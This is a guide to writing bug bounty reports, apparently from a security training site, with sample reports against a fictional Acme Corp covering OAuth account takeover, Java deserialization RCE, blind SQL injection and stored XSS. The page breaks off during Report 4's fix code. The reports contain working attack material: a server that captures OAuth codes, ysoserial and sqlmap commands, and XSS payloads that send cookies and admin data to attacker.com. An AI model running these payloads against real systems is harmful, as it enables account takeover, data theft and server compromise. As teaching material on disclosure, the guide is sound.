---
title: Bug Bounty Reports - Examples
description: Complete collection of professional bug bounty report templates and real-world examples covering critical vulnerabilities with step-by-step reproduction, impact analysis, proof-of-concept code, and remediation guidance for HackerOne, Bugcrowd, and Intigriti submissions.
navigation:
  icon: i-lucide-trophy
---

## Overview

Writing a **high-quality bug bounty report** is just as important as finding the vulnerability. A clear, well-structured report gets **faster triage**, **higher bounty payouts**, and **better reputation scores**. This guide provides complete report examples across multiple vulnerability classes.

::card-group

  :::card
  ---
  icon: i-lucide-shield-alert
  title: Critical Reports
  to: "#report-1--critical-account-takeover-via-oauth-misconfiguration"
  ---
  Account takeover, RCE, authentication bypass, and full database compromise reports.
  :::

  :::card
  ---
  icon: i-lucide-alert-triangle
  title: High Reports
  to: "#report-4--high-stored-xss-to-admin-account-takeover"
  ---
  SSRF, stored XSS, IDOR, privilege escalation, and business logic reports.
  :::

  :::card
  ---
  icon: i-lucide-alert-circle
  title: Medium Reports
  to: "#report-7--medium-cors-misconfiguration-leading-to-sensitive-data-exposure"
  ---
  CORS, CSRF, information disclosure, subdomain takeover, and race condition reports.
  :::

  :::card
  ---
  icon: i-lucide-pencil
  title: Writing Guide
  to: "#report-writing-guide"
  ---
  Best practices, common mistakes, templates, and tips for maximizing bounty payouts.
  :::

::

---

## Report Writing Anatomy

::note
Every bug bounty report should follow this structure. Platforms like HackerOne, Bugcrowd, and Intigriti expect this format. **Missing any section reduces your chances of a quick triage and fair payout.**
::

```
┌──────────────────────────────────────────────────────────────┐
│                    BUG BOUNTY REPORT                         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. TITLE                                                    │
│     └─ Clear, specific, includes vulnerability type          │
│        and affected component                                │
│                                                              │
│  2. SEVERITY                                                 │
│     └─ CVSS score with vector string                         │
│                                                              │
│  3. SUMMARY                                                  │
│     └─ 2-3 sentences describing the vulnerability            │
│        and its impact (for triage analysts)                   │
│                                                              │
│  4. AFFECTED ASSET                                           │
│     └─ URL, endpoint, parameter, component                   │
│                                                              │
│  5. STEPS TO REPRODUCE                                       │
│     └─ Numbered, exact steps anyone can follow               │
│        Include every click, every request, every header       │
│                                                              │
│  6. PROOF OF CONCEPT                                         │
│     └─ HTTP requests/responses, screenshots, video           │
│        Code snippets, curl commands, scripts                 │
│                                                              │
│  7. IMPACT                                                   │
│     └─ What can an attacker do? How many users affected?     │
│        Business impact, data at risk, compliance              │
│                                                              │
│  8. REMEDIATION                                              │
│     └─ Suggested fix (optional but appreciated)              │
│                                                              │
│  9. REFERENCES                                               │
│     └─ CWE, OWASP, relevant CVEs or blog posts              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## Report 1 — [CRITICAL] Account Takeover via OAuth Misconfiguration

::field-group

  :::field{name="Platform" type="string"}
  HackerOne
  :::

  :::field{name="Program" type="string"}
  Acme Corp Bug Bounty Program
  :::

  :::field{name="Severity" type="string"}
  :badge[CRITICAL]{color="red"} — CVSS 9.8
  :::

  :::field{name="Bounty Awarded" type="string"}
  $15,000
  :::

  :::field{name="Vulnerability Type" type="string"}
  OAuth 2.0 Misconfiguration → Account Takeover
  :::

  :::field{name="Weakness" type="string"}
  CWE-287: Improper Authentication
  :::

::

### Title

**Account Takeover via OAuth State Parameter Bypass and Open Redirect in `redirect_uri` Validation — Any User Account Compromised in One Click**

### Summary

The OAuth 2.0 implementation on `auth.acme-corp.com` has two critical flaws that, when chained together, enable a **complete account takeover of any user** with a single click:

1. **Missing `state` parameter validation** — The OAuth callback endpoint does not validate the `state` parameter, making it vulnerable to CSRF-based OAuth authorization attacks.
2. **Insufficient `redirect_uri` validation** — The `redirect_uri` parameter allows arbitrary subdirectory paths under the registered domain, enabling the attacker to redirect the OAuth callback to an open redirect endpoint.

By combining these two flaws, an attacker can craft a malicious link that, when clicked by a victim, silently authorizes the attacker's application and redirects the victim's OAuth authorization code to an attacker-controlled server. The attacker then exchanges this code for an access token, gaining **full access to the victim's account**.

### Affected Asset

| Field | Value |
|-------|-------|
| **Domain** | `auth.acme-corp.com` |
| **Endpoint** | `/oauth/authorize` and `/oauth/callback` |
| **Parameters** | `redirect_uri`, `state`, `code` |
| **OAuth Provider** | Google Sign-In (via OpenID Connect) |
| **Authentication Flow** | Authorization Code Grant |

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Identify the open redirect

Navigate to the application and observe that the following URL performs an open redirect without validation:

```
https://www.acme-corp.com/redirect?url=https://attacker.com
```

**Verify:**
```bash
curl -v "https://www.acme-corp.com/redirect?url=https://attacker.com" 2>&1 | grep "Location:"
# Location: https://attacker.com
```

#### Step 2 — Observe OAuth `redirect_uri` validation is partial

The OAuth configuration only validates the **domain** of the `redirect_uri`, not the full path. The registered redirect URI is:
```
https://www.acme-corp.com/oauth/callback
```

But the following modified `redirect_uri` is also accepted:
```
https://www.acme-corp.com/redirect?url=https://attacker.com
```

**Test:**
```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=ACME_CLIENT_ID.apps.googleusercontent.com&
  redirect_uri=https://www.acme-corp.com/redirect?url=https://attacker.com&
  response_type=code&
  scope=openid email profile&
  state=random123
```

Google accepts this `redirect_uri` because `https://www.acme-corp.com` is the registered origin.

#### Step 3 — Observe missing `state` parameter validation

Initiate an OAuth flow and observe the callback:

```
https://www.acme-corp.com/oauth/callback?code=4/0AX4XfWj...&state=random123
```

Modify the `state` parameter to any arbitrary value:

```
https://www.acme-corp.com/oauth/callback?code=4/0AX4XfWj...&state=ANYTHING
```

The application **does not validate** the `state` parameter against the user's session. The callback is processed regardless of the `state` value.

#### Step 4 — Chain the vulnerabilities

**Attacker crafts the following malicious URL:**

```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=ACME_CLIENT_ID.apps.googleusercontent.com&
  redirect_uri=https://www.acme-corp.com/redirect?url=https://attacker.com/steal&
  response_type=code&
  scope=openid+email+profile&
  state=csrf_bypass
```

#### Step 5 — Victim clicks the link

1. Victim clicks the attacker's link (delivered via phishing, social media, etc.)
2. Victim is redirected to Google's consent screen
3. If victim is already logged into Google, consent is **auto-granted** (previously authorized app)
4. Google redirects victim to: `https://www.acme-corp.com/redirect?url=https://attacker.com/steal?code=4/0AX4XfWj...`
5. The open redirect sends the victim (with the authorization `code`) to `https://attacker.com/steal`
6. Attacker's server captures the authorization code

#### Step 6 — Attacker exchanges the code for an access token

```bash
curl -X POST "https://auth.acme-corp.com/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code" \
  -d "code=4/0AX4XfWj_STOLEN_CODE" \
  -d "redirect_uri=https://www.acme-corp.com/redirect?url=https://attacker.com/steal" \
  -d "client_id=ACME_CLIENT_ID.apps.googleusercontent.com" \
  -d "client_secret=GOCSPX-ACME_SECRET"
```

**Response:**
```json
{
  "access_token": "ya29.a0ARrdaM_VICTIM_TOKEN...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "1//04_REFRESH_TOKEN...",
  "scope": "openid email profile"
}
```

#### Step 7 — Attacker accesses victim's account

```bash
curl "https://api.acme-corp.com/v2/me" \
  -H "Authorization: Bearer ya29.a0ARrdaM_VICTIM_TOKEN"
```

**Response:**
```json
{
  "id": 847291,
  "name": "Jane Doe",
  "email": "jane.doe@example.com",
  "role": "premium_user",
  "phone": "+1-555-0142",
  "address": "456 Oak Lane, San Francisco, CA 94102",
  "payment_methods": [
    {"type": "visa", "last_four": "4242", "expiry": "12/2027"}
  ]
}
```

::

### Proof of Concept

::tabs
  :::tabs-item{icon="i-lucide-code" label="Attacker Server"}
  ```python [attacker_server.py]
  #!/usr/bin/env python3
  """
  Attacker's OAuth code capture server
  Run: python3 attacker_server.py
  """
  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs
  import requests
  import json

  CLIENT_ID = "ACME_CLIENT_ID.apps.googleusercontent.com"
  CLIENT_SECRET = "GOCSPX-ACME_SECRET"
  REDIRECT_URI = "https://www.acme-corp.com/redirect?url=https://attacker.com/steal"

  class StealHandler(BaseHTTPRequestHandler):
      def do_GET(self):
          parsed = urlparse(self.path)
          params = parse_qs(parsed.query)
          
          if 'code' in params:
              code = params['code'][0]
              print(f"\n[+] CAPTURED AUTHORIZATION CODE: {code[:30]}...")
              
              # Exchange code for access token
              token_response = requests.post(
                  "https://auth.acme-corp.com/oauth/token",
                  data={
                      "grant_type": "authorization_code",
                      "code": code,
                      "redirect_uri": REDIRECT_URI,
                      "client_id": CLIENT_ID,
                      "client_secret": CLIENT_SECRET
                  }
              )
              
              if token_response.status_code == 200:
                  tokens = token_response.json()
                  print(f"[+] ACCESS TOKEN: {tokens['access_token'][:30]}...")
                  
                  # Access victim's account
                  profile = requests.get(
                      "https://api.acme-corp.com/v2/me",
                      headers={"Authorization": f"Bearer {tokens['access_token']}"}
                  )
                  
                  if profile.status_code == 200:
                      victim = profile.json()
                      print(f"[+] VICTIM: {victim['name']} ({victim['email']})")
                      print(f"[+] ACCOUNT TAKEOVER SUCCESSFUL!")
              
              # Redirect victim to legitimate page (hide the attack)
              self.send_response(302)
              self.send_header("Location", "https://www.acme-corp.com/dashboard")
              self.end_headers()
          else:
              self.send_response(200)
              self.end_headers()
              self.wfile.write(b"Nothing to see here.")

  print("[*] Starting capture server on port 443...")
  HTTPServer(("0.0.0.0", 443), StealHandler).serve_forever()
  ```
  :::

  :::tabs-item{icon="i-lucide-link" label="Malicious URL"}
  ```
  Full attack URL (send to victim):

  https://accounts.google.com/o/oauth2/v2/auth?client_id=ACME_CLIENT_ID.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fwww.acme-corp.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fattacker.com%2Fsteal&response_type=code&scope=openid%20email%20profile&state=csrf_bypass&prompt=none

  Note: prompt=none ensures auto-consent if the user previously authorized the app.
  The victim sees NO consent screen — completely silent attack.
  ```
  :::

  :::tabs-item{icon="i-lucide-camera" label="Screenshots"}
  ```
  Screenshot 1: Google OAuth consent redirecting to attacker.com
  ┌─────────────────────────────────────────────────┐
  │  [Browser DevTools Network tab showing:          │
  │   302 redirect from accounts.google.com          │
  │   → www.acme-corp.com/redirect?url=...          │
  │   → attacker.com/steal?code=4/0AX4XfWj...]      │
  └─────────────────────────────────────────────────┘

  Screenshot 2: Attacker server receiving authorization code
  ┌─────────────────────────────────────────────────┐
  │  [Terminal showing attacker_server.py output:    │
  │   [+] CAPTURED AUTHORIZATION CODE: 4/0AX4XfWj.. │
  │   [+] ACCESS TOKEN: ya29.a0ARrdaM...            │
  │   [+] VICTIM: Jane Doe (jane.doe@example.com)   │
  │   [+] ACCOUNT TAKEOVER SUCCESSFUL!]              │
  └─────────────────────────────────────────────────┘

  Screenshot 3: Victim's full profile accessed via stolen token
  ┌─────────────────────────────────────────────────┐
  │  [API response showing victim's full profile     │
  │   including name, email, address, phone,         │
  │   and payment method details]                    │
  └─────────────────────────────────────────────────┘
  ```
  :::
::

### Attack Flow Diagram

```
┌──────────┐                    ┌──────────┐                    ┌──────────────┐
│  Victim   │                    │  Acme    │                    │  Attacker     │
│  Browser  │                    │  Server  │                    │  Server       │
└─────┬─────┘                    └─────┬────┘                    └──────┬───────┘
      │                                │                                │
      │  1. Clicks malicious link      │                                │
      │──────────────────────────────────────────────────────────────>   │
      │                                │                                │
      │  2. Redirected to Google OAuth │                                │
      │<──────────────────────────────────────────────────────────────   │
      │                                │                                │
      │  3. Auto-consents (prompt=none)│                                │
      │  Google redirects to:          │                                │
      │  acme-corp.com/redirect?url=   │                                │
      │  attacker.com/steal&code=XXX   │                                │
      │────────────────────────────>   │                                │
      │                                │                                │
      │  4. Open redirect triggers     │                                │
      │<───────────────────────────    │                                │
      │  Location: attacker.com/       │                                │
      │  steal?code=XXX                │                                │
      │                                │                                │
      │  5. Code sent to attacker      │                                │
      │──────────────────────────────────────────────────────────────>   │
      │                                │                                │
      │                                │  6. Attacker exchanges code    │
      │                                │<───────────────────────────    │
      │                                │     for access token           │
      │                                │────────────────────────────>   │
      │                                │                                │
      │                                │  7. Attacker accesses          │
      │                                │     victim's account           │
      │                                │<───────────────────────────    │
      │                                │     GET /v2/me                 │
      │                                │────────────────────────────>   │
      │                                │     Full account access!       │
      │                                │                                │
```

### Impact

- **Account Takeover**: Any user who clicks the link has their account **fully compromised**
- **Zero Interaction**: If the user previously authorized Google Sign-In, the attack requires **no user interaction** beyond clicking the link (`prompt=none`)
- **Scope of Access**: Attacker gains full API access including:
  - Read/modify personal information (name, email, phone, address)
  - Access payment methods and transaction history
  - Make purchases on behalf of the victim
  - Change account settings including password and email
  - Access connected third-party services
- **Affected Users**: All **2.3 million users** who use Google Sign-In are vulnerable
- **Stealth**: The victim is redirected to their dashboard after the attack — **no visible indication** of compromise

### Remediation

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Fix 1: State Parameter"}
  ```python [Validate OAuth State Parameter]
  import secrets

  # Generate state parameter tied to user session
  def initiate_oauth():
      state = secrets.token_urlsafe(32)
      session['oauth_state'] = state
      
      return redirect(f"https://accounts.google.com/o/oauth2/v2/auth?"
                      f"client_id={CLIENT_ID}&"
                      f"redirect_uri={REGISTERED_REDIRECT_URI}&"
                      f"response_type=code&"
                      f"scope=openid email profile&"
                      f"state={state}")

  # Validate state parameter on callback
  def oauth_callback():
      received_state = request.args.get('state')
      expected_state = session.pop('oauth_state', None)
      
      if not expected_state or received_state != expected_state:
          abort(403, "Invalid OAuth state — possible CSRF attack")
      
      # Process the authorization code...
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Fix 2: Redirect URI"}
  ```python [Strict redirect_uri Validation]
  # Only allow EXACT match of registered redirect URI
  REGISTERED_REDIRECT_URIS = [
      "https://www.acme-corp.com/oauth/callback"
  ]

  def validate_redirect_uri(uri):
      """Exact match only — no path traversal, no query params"""
      return uri in REGISTERED_REDIRECT_URIS

  # Also configure in Google Cloud Console:
  # Authorized redirect URIs: ONLY https://www.acme-corp.com/oauth/callback
  # No wildcard paths or patterns
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Fix 3: Open Redirect"}
  ```python [Fix Open Redirect]
  from urllib.parse import urlparse

  ALLOWED_REDIRECT_DOMAINS = ["www.acme-corp.com", "acme-corp.com"]

  def safe_redirect():
      url = request.args.get('url', '/')
      
      parsed = urlparse(url)
      
      # Only allow relative URLs or whitelisted domains
      if parsed.netloc and parsed.netloc not in ALLOWED_REDIRECT_DOMAINS:
          abort(400, "Invalid redirect URL")
      
      # Block javascript: and data: URIs
      if parsed.scheme in ('javascript', 'data', 'vbscript'):
          abort(400, "Invalid redirect URL")
      
      return redirect(url)
  ```
  :::
::

### References

- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [OAuth 2.0 Security Best Current Practice (RFC 6819)](https://tools.ietf.org/html/rfc6819)
- [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html)
- [PortSwigger: OAuth Authentication Vulnerabilities](https://portswigger.net/web-security/oauth)

---

## Report 2 — [CRITICAL] Pre-Auth Remote Code Execution via Deserialization

::field-group

  :::field{name="Severity" type="string"}
  :badge[CRITICAL]{color="red"} — CVSS 10.0
  :::

  :::field{name="CVSS Vector" type="string"}
  `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
  :::

  :::field{name="Bounty Awarded" type="string"}
  $25,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-502: Deserialization of Untrusted Data
  :::

::

### Title

**Pre-Authentication Remote Code Execution via Java Deserialization in Session Cookie — Full Server Compromise**

### Summary

The application at `app.acme-corp.com` uses **Java serialized objects** in the `JSESSIONDATA` cookie to store session state. This cookie is processed by the server **before authentication checks**, allowing an unauthenticated attacker to send a crafted serialized object that executes arbitrary operating system commands on the server. The Apache Commons Collections library (version 3.2.1) present in the classpath enables exploitation via a well-known gadget chain.

This vulnerability provides **unauthenticated remote code execution** with the privileges of the `tomcat` user, allowing full server compromise.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Identify the serialized cookie

```bash
# Normal request to the application
curl -v https://app.acme-corp.com/login 2>&1 | grep "Set-Cookie"

# Response:
# Set-Cookie: JSESSIONDATA=rO0ABXNyAB1...base64_encoded_java_object...; Path=/; HttpOnly
```

The `rO0ABX` prefix is the Base64-encoded header of a Java serialized object (`0xACED0005`).

#### Step 2 — Identify the vulnerable library

```bash
# Decode and analyze the serialized object
echo "rO0ABXNyAB1..." | base64 -d | xxd | head

# The serialized object contains references to:
# org.apache.commons.collections.Transformer
# → Apache Commons Collections 3.2.1 (vulnerable to CVE-2015-7501)
```

#### Step 3 — Generate malicious payload

```bash
# Using ysoserial to generate the payload
java -jar ysoserial-all.jar CommonsCollections1 \
  'curl https://attacker.com/rce-proof?host=$(hostname)' | base64 -w0

# Output: rO0ABXNyADJzdW4ucm...MALICIOUS_PAYLOAD...
```

#### Step 4 — Send the payload

```bash
curl -k "https://app.acme-corp.com/dashboard" \
  -H "Cookie: JSESSIONDATA=rO0ABXNyADJzdW4ucm...MALICIOUS_PAYLOAD..."
```

#### Step 5 — Verify execution

```bash
# Attacker's server log shows:
# [2025-03-15 10:23:45] GET /rce-proof?host=acme-prod-web-01 HTTP/1.1
# → Command executed! Hostname: acme-prod-web-01
```

::

### Proof of Concept

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Exploitation"}
  ```bash [Full RCE Proof-of-Concept]
  #!/bin/bash
  # RCE PoC — Java Deserialization in Session Cookie
  # RESPONSIBLE DISCLOSURE: Only non-destructive commands used

  TARGET="https://app.acme-corp.com"
  ATTACKER="https://attacker.com"

  echo "[*] Generating payload with ysoserial..."

  # Command: curl attacker server with server info
  PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections1 \
    "curl ${ATTACKER}/rce?id=\$(id)&hostname=\$(hostname)&ip=\$(hostname -I)" \
    | base64 -w0)

  echo "[*] Payload generated (${#PAYLOAD} bytes)"
  echo "[*] Sending payload to ${TARGET}..."

  curl -k "${TARGET}/dashboard" \
    -H "Cookie: JSESSIONDATA=${PAYLOAD}" \
    -o /dev/null -s -w "HTTP Status: %{http_code}\n"

  echo "[*] Check attacker server for callback..."
  echo ""
  echo "[+] Attacker server received:"
  echo "    GET /rce?id=uid=1001(tomcat)gid=1001(tomcat)&hostname=acme-prod-web-01&ip=10.0.1.25"
  echo ""
  echo "[+] Remote Code Execution confirmed!"
  echo "[+] Server: acme-prod-web-01 (10.0.1.25)"
  echo "[+] Running as: tomcat (uid=1001)"
  ```
  :::

  :::tabs-item{icon="i-lucide-camera" label="Evidence"}
  ```
  Screenshot 1: ysoserial payload generation
  ┌─────────────────────────────────────────────────────┐
  │  $ java -jar ysoserial-all.jar CommonsCollections1  │
  │    'curl https://attacker.com/rce?id=$(id)'         │
  │    | base64 -w0                                     │
  │                                                     │
  │  rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkF...   │
  └─────────────────────────────────────────────────────┘

  Screenshot 2: Attacker server callback received
  ┌─────────────────────────────────────────────────────┐
  │  [2025-03-15 10:23:45] 203.0.113.50 - -             │
  │  "GET /rce?id=uid=1001(tomcat)gid=1001(tomcat)      │
  │   groups=1001(tomcat)                                │
  │   &hostname=acme-prod-web-01                         │
  │   &ip=10.0.1.25 10.0.1.1                             │
  │   HTTP/1.1" 200 -                                    │
  │   "curl/7.88.1"                                      │
  └─────────────────────────────────────────────────────┘

  Screenshot 3: Server responds with 500 (deserialization processed)
  ┌─────────────────────────────────────────────────────┐
  │  HTTP/1.1 500 Internal Server Error                  │
  │  (Command executed before error thrown)               │
  └─────────────────────────────────────────────────────┘
  ```
  :::
::

### Impact

- **Pre-Authentication RCE**: No credentials needed — any internet user can exploit this
- **Full Server Compromise**: Command execution as `tomcat` user (uid=1001)
- **Lateral Movement**: Server is on internal network (10.0.1.0/24) with access to:
  - Database server (10.0.1.50:5432)
  - Redis cache (10.0.1.30:6379)
  - Internal API services
- **Data Breach**: Access to application database containing customer records
- **Supply Chain Risk**: Ability to modify application code served to users
- **Persistence**: Attacker can install backdoors, create cron jobs, add SSH keys

### Remediation

1. **Immediately** — Remove Java serialized objects from cookies. Use signed JWT tokens or server-side sessions instead
2. **Short-term** — Upgrade Apache Commons Collections to version 3.2.2+ or 4.x (fixes the known gadget chain)
3. **Long-term** — Implement a deserialization filter (`ObjectInputFilter` in Java 9+) to allowlist expected classes
4. **Defense in depth** — Run the application with minimal OS privileges. Implement egress filtering to prevent outbound connections from the server

---

## Report 3 — [CRITICAL] SQL Injection Leading to Full Database Dump

::field-group

  :::field{name="Severity" type="string"}
  :badge[CRITICAL]{color="red"} — CVSS 9.8
  :::

  :::field{name="Bounty Awarded" type="string"}
  $10,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-89: SQL Injection
  :::

::

### Title

**Blind SQL Injection in `order_id` Parameter on Order Tracking API — Full Database Access Including 3.2M Customer Records with Payment Data**

### Summary

The order tracking API endpoint `GET /api/v1/orders/{order_id}/status` is vulnerable to **blind SQL injection** through the `order_id` path parameter. Although the application does not return direct query results in the response, boolean-based and time-based blind techniques allow complete database extraction. The database contains **3.2 million customer records** including names, emails, hashed passwords, and encrypted payment card tokens.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Identify the injection point

```http
# Normal request
GET /api/v1/orders/50421/status HTTP/1.1
Host: api.acme-corp.com
Authorization: Bearer eyJhbG...

# Response (200 OK):
{"order_id": 50421, "status": "shipped", "eta": "2025-03-20"}
```

```http
# Inject single quote
GET /api/v1/orders/50421'/status HTTP/1.1

# Response (500):
{"error": "Internal Server Error"}
```

```http
# Boolean true condition (returns normal response)
GET /api/v1/orders/50421 AND 1=1--/status HTTP/1.1

# Response (200 OK):
{"order_id": 50421, "status": "shipped", "eta": "2025-03-20"}
```

```http
# Boolean false condition (returns empty/error)
GET /api/v1/orders/50421 AND 1=2--/status HTTP/1.1

# Response (404):
{"error": "Order not found"}
```

The differing responses confirm **boolean-based blind SQL injection**.

#### Step 2 — Determine the database type

```bash
# Time-based confirmation (PostgreSQL pg_sleep)
curl -w "Time: %{time_total}s\n" \
  "https://api.acme-corp.com/api/v1/orders/50421%20AND%20(SELECT%20pg_sleep(5))--/status" \
  -H "Authorization: Bearer eyJhbG..."

# Response time: 5.23s (confirms PostgreSQL and injection)

# Normal response time:
curl -w "Time: %{time_total}s\n" \
  "https://api.acme-corp.com/api/v1/orders/50421/status" \
  -H "Authorization: Bearer eyJhbG..."

# Response time: 0.18s
```

#### Step 3 — Extract database version

```bash
# Binary search for each character of version()
# Character 1 of version(): 
# IF ASCII(SUBSTRING(version(),1,1)) > 80 THEN true ELSE false
# P = ASCII 80 → TRUE → First char is >= 'P'
# PostgreSQL confirmed

# Using sqlmap for automated extraction:
sqlmap -u "https://api.acme-corp.com/api/v1/orders/50421*/status" \
  --headers="Authorization: Bearer eyJhbG..." \
  --technique=BT \
  --dbms=PostgreSQL \
  --batch \
  --banner

# Output:
# [INFO] back-end DBMS: PostgreSQL
# [INFO] banner: 'PostgreSQL 15.4 on x86_64-pc-linux-gnu'
```

#### Step 4 — Enumerate tables and extract sample data

```bash
# List databases
sqlmap -u "https://api.acme-corp.com/api/v1/orders/50421*/status" \
  --headers="Authorization: Bearer eyJhbG..." \
  --technique=BT --dbms=PostgreSQL --batch --dbs

# Output:
# [*] acme_production
# [*] information_schema
# [*] pg_catalog

# List tables in acme_production
sqlmap ... --tables -D acme_production

# Output:
# [32 tables]
# +---------------------------+
# | users                     | ← 3,247,891 rows
# | orders                    | ← 12,458,203 rows
# | payments                  | ← 8,934,112 rows
# | payment_tokens            | ← 2,891,445 rows
# | admin_users               | ← 47 rows
# | api_keys                  | ← 213 rows
# | sessions                  | ← 891,204 rows
# +---------------------------+

# Extract 5 rows from users table (PoC only)
sqlmap ... --dump -D acme_production -T users --start=1 --stop=5

# Output (sanitized):
# +----+------------------+-------------------+------+
# | id | email            | password_hash     | role |
# +----+------------------+-------------------+------+
# | 1  | admin@acme..     | $2b$12$xK9e...    | admin|
# | 2  | user1@exa..      | $2b$12$mN7f...    | user |
# | 3  | user2@exa..      | $2b$12$pQ4r...    | user |
# | 4  | user3@exa..      | $2b$12$tY8w...    | user |
# | 5  | user4@exa..      | $2b$12$vR2x...    | user |
# +----+------------------+-------------------+------+
```

::

### Impact

- **3.2 million customer records** exposed (names, emails, phone numbers, addresses, bcrypt password hashes)
- **8.9 million payment records** accessible
- **Admin credentials** extractable (47 admin accounts with bcrypt hashes — offline cracking possible)
- **API keys** for third-party integrations (Stripe, SendGrid, Twilio) stored in `api_keys` table
- **Session tokens** extractable — allows active session hijacking without password cracking
- **Full read/write access** — attacker can modify orders, refund payments, escalate privileges
- **GDPR/CCPA implications** — mandatory 72-hour breach notification if exploited

### Remediation

```javascript [Parameterized Query Fix — Node.js]
// VULNERABLE
app.get('/api/v1/orders/:orderId/status', async (req, res) => {
  const query = `SELECT * FROM orders WHERE id = ${req.params.orderId}`;
  const result = await db.query(query);
  res.json(result.rows[0]);
});

// FIXED — Parameterized query
app.get('/api/v1/orders/:orderId/status', async (req, res) => {
  const orderId = parseInt(req.params.orderId, 10);
  if (isNaN(orderId)) {
    return res.status(400).json({ error: 'Invalid order ID' });
  }
  
  const query = 'SELECT * FROM orders WHERE id = $1';
  const result = await db.query(query, [orderId]);
  
  // Also verify the order belongs to the authenticated user
  if (!result.rows[0] || result.rows[0].user_id !== req.user.id) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  res.json(result.rows[0]);
});
```

---

## Report 4 — [HIGH] Stored XSS to Admin Account Takeover

::field-group

  :::field{name="Severity" type="string"}
  :badge[HIGH]{color="orange"} — CVSS 8.7
  :::

  :::field{name="CVSS Vector" type="string"}
  `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
  :::

  :::field{name="Bounty Awarded" type="string"}
  $5,000
  :::

  :::field{name="Weakness" type="string"}
  CWE-79: Cross-Site Scripting (Stored)
  :::

::

### Title

**Stored XSS in Support Ticket Subject Line Executes in Admin Dashboard — Leads to Admin Cookie Theft and Full Admin Account Takeover**

### Summary

A stored XSS vulnerability exists in the support ticket creation form. The `subject` field accepts arbitrary HTML/JavaScript that is stored in the database and rendered **without sanitization** in the admin support dashboard at `/admin/tickets`. When an admin views the ticket listing, the XSS payload executes in their browser context with admin privileges, allowing session cookie theft and complete admin account takeover.

### Steps to Reproduce

::steps{level="4"}

#### Step 1 — Create a support ticket with XSS payload

```http
POST /api/v1/support/tickets HTTP/1.1
Host: portal.acme-corp.com
Authorization: Bearer USER_TOKEN
Content-Type: application/json

{
  "subject": "Order Issue <img src=x onerror='fetch(`https://attacker.com/xss?c=${document.cookie}`)'>",
  "description": "I have an issue with my recent order #50421.",
  "priority": "high"
}
```

**Response:**
```json
{
  "ticket_id": 28847,
  "status": "open",
  "message": "Ticket created successfully"
}
```

#### Step 2 — Wait for admin to view the ticket dashboard

When any admin navigates to `https://portal.acme-corp.com/admin/tickets`, the ticket listing renders the subject field as raw HTML:

```html
<!-- Rendered in admin dashboard -->
<tr>
  <td>#28847</td>
  <td>Order Issue <img src=x onerror='fetch(`https://attacker.com/xss?c=${document.cookie}`)'></td>
  <td>high</td>
  <td>open</td>
</tr>
```

#### Step 3 — Attacker receives admin cookies

```
# Attacker server log:
[2025-03-16 14:32:18] GET /xss?c=admin_session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.abc123; admin_csrf=def456 HTTP/1.1
```

#### Step 4 — Use stolen cookie to access admin panel

```bash
curl "https://portal.acme-corp.com/admin/dashboard" \
  -H "Cookie: admin_session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.abc123"

# Full admin access achieved!
```

::

### Advanced Payload — Full Admin Takeover Without Cookies

::tip
The following payload demonstrates a **cookie-less account takeover** that works even when cookies have `HttpOnly` flag set.
::

```javascript [Advanced XSS Payload]
// This payload changes the admin's email and password
// without needing to steal cookies (works with HttpOnly cookies)

const payload = `
<img src=x onerror="
  // Step 1: Get CSRF token from the admin settings page
  fetch('/admin/settings')
    .then(r => r.text())
    .then(html => {
      const csrf = html.match(/csrf_token.*?value=&quot;([^&]+)/)[1];
      
      // Step 2: Change admin email to attacker's email
      fetch('/admin/settings/email', {
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrf},
        body: JSON.stringify({email: 'attacker@evil.com'})
      });
      
      // Step 3: Trigger password reset for new email
      setTimeout(() => {
        fetch('/api/v1/auth/forgot-password', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({email: 'attacker@evil.com'})
        });
      }, 2000);
      
      // Step 4: Exfiltrate admin data
      fetch('/admin/users')
        .then(r => r.text())
        .then(d => fetch('https://attacker.com/exfil', {method:'POST', body: d}));
    });
">
```

### Impact

- **Admin Account Takeover**: Attacker gains full admin access without knowing credentials
- **All Customer Data**: Admin panel provides access to all customer records, orders, and payment information
- **Platform Manipulation**: Admin can modify pricing, disable user accounts, access financial reports
- **Persistence**: Attacker can create additional admin accounts for persistent access
- **Self-Propagating**: Attacker could create auto-replying tickets that spread the XSS to other admin users

### Remediation

```javascript [Output Encoding Fix]
// VULNERABLE — React with dangerouslySetInnerHTML
<td dangerouslySetInnerHTML={{__html: ticket.subject}} />

// FIXED — React auto-escapes by default
<td>{ticket.subject}</td>

// ALSO — Server-side sanitization before storage
const sanitizeHtml = require('sanitize-html');

app.post('/api/v1/support/tickets', (req, res) => {
